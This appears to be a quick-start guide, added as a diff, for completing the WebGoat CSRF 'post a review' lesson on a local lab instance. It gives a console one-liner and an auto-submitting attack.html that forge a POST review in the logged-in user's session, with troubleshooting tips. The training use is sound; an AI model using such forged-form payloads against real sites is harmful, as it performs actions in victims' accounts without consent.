@@ -1,0 +1,59 @@
+=== CSRF POST Review - Quick Start ===
+
+🎯 OBJECTIVE: Post a review on behalf of logged-in user
+
+✅ FASTEST SOLUTION:
+
+1. Log into WebGoat at http://192.168.254.112:8001
+2. Keep that browser tab open
+3. Open csrf_post_review.html in SAME browser
+4. Click "🚀 POST REVIEW VIA CSRF" button
+5. Check WebGoat - review should appear!
+
+📝 ONE-LINER (Browser Console):
+
+Press F12 in WebGoat, paste in Console:
+
+const f=document.createElement('form');f.method='POST';f.action='http://192.168.254.112:8001/WebGoat/csrf/review';const s=document.createElement('input');s.name='stars';s.value='5';f.appendChild(s);const r=document.createElement('input');r.name='reviewText';r.value='CSRF Attack!';f.appendChild(r);document.body.appendChild(f);f.submit();
+
+🔧 MANUAL HTML FILE:
+
+Save this as attack.html and open it:
+
+<!DOCTYPE html>
+<html>
+<body>
+<form action="http://192.168.254.112:8001/WebGoat/csrf/review" method="POST">
+    <input name="stars" value="5">
+    <input name="reviewText" value="CSRF Review!">
+    <button>Submit</button>
+</form>
+<script>document.forms[0].submit();</script>
+</body>
+</html>
+
+💡 WHAT'S HAPPENING:
+- You create a form that POSTs to WebGoat
+- Browser includes your session cookie automatically
+- Review is posted without user's explicit consent
+- That's CSRF!
+
+✅ SUCCESS INDICATORS:
+- New review appears in WebGoat
+- Shows your username
+- "Lesson Completed" message
+- Green checkmark
+
+🔍 IF IT DOESN'T WORK:
+- Make sure you're logged in
+- Refresh WebGoat page
+- Try different endpoint: /WebGoat/csrf/post-review
+- Check browser console for errors
+- Use csrf_post_review.html (tries multiple endpoints)
+
+📂 Files:
+- csrf_post_review.html (USE THIS - best option)
+- csrf_post_review.ps1 (PowerShell backup)
+- csrf_post_review_guide.txt (full guide)
+
+🚀 GO!
